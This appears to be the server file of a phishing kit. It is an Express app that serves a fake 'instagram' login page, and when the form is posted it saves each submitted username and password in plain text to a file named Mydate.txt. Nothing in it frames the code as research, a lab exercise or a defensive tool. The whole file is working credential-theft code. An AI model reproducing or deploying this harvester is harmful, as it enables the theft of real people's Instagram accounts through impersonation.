import express from "express";
import path from "path"
import fs from "fs"

const app = express();

let date = [];

app.use(express.urlencoded({
    extended: true
}));

app.use(express.static("instagram"));

app.get("/", (req, res) => {
    res.redirect("/instagram");
});

app.post("/instagram", (req, res) => {
    const{username , password } = req.body;
    date.push({
        username,
        password
    });

    fs.promises
              //.writeFile(path.resolve("Mydate.json"), JSON.stringify(date, undefined, 2))
              .writeFile(path.resolve("Mydate.txt"), JSON.stringify(date, undefined, 2))
              .then(()=> {
                //res.send("receved");
                res.redirect("/instagram");
              });
})

app.get("/instagram", (req, res)=> {
    res.sendFile(path.resolve("instagram/instagram.html"))
})

app.listen(process.env.PORT);